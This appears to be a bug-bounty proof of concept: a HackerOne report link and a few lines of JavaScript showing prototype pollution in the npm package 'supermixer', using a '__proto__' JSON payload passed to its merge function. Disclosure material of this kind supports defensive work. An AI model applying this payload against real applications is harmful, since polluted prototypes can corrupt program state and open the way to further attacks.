https://hackerone.com/reports/959987
    var mixer = require('supermixer');
    obj = {}

    var payload = '{"__proto__":{"polluted":"yes"}}';//payload

    mixer.merge({},JSON.parse(payload));
  